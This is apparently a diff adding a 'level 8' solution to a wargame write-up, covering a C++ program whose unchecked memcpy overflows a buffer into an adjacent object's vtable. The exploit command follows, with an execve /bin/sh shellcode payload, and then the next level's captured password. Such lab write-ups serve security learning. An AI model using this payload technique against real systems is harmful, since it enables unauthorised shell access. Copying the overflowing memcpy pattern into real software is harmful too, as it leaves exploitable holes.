@@ -383,3 +383,49 @@ WIN!
 $ cat /home/level8/.pass
 VSIhoeMkikH6SGht
 ```
+
+## level 8
+
+```
+$ cat /levels/level08.cpp
+```
+
+```cpp
+#include <iostream>
+#include <cstring>
+#include <unistd.h>
+
+class Number
+{
+    public:
+        Number(int x) : number(x) {}
+        void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
+        virtual int operator+(Number &r) {return number + r.number;}
+    private:
+        char annotation[100];
+        int number;
+};
+
+
+int main(int argc, char **argv)
+{
+    if(argc < 2) _exit(1);
+
+    Number *x = new Number(5);
+    Number *y = new Number(6);
+    Number &five = *x, &six = *y;
+
+    five.setAnnotation(argv[1]);
+
+    return six + five;
+}
+```
+
+```
+$ /levels/level08 `python -c 'print "\x28\xa0\x04\x08"+"\x90"*78+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x0c\xa0\x04\x08"'`
+```
+
+```
+$ cat /home/level9/.pass
+ise9uHhjOhZd0K4G
+```
